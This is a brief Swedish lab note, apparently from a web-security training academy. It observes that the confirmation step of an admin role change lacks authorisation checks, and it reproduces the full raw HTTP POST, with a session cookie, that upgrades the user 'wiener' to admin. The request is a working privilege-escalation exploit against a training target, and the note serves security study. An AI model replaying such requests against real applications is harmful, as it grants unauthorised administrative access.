ingen authentication på andra steget när man bekräftar upgrade eller downgrade. vem som kan göra det såvida dom vet hur requesten ska se ut.

```
POST /admin-roles HTTP/2
Host: 0a7f00a803426f6180b17b2a001500de.web-security-academy.net
Cookie: session=7bdNGZX88LWxMIxOtEX9PU9stpX8YA2f
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0a7f00a803426f6180b17b2a001500de.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7f00a803426f6180b17b2a001500de.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

action=upgrade&confirmed=true&username=wiener
```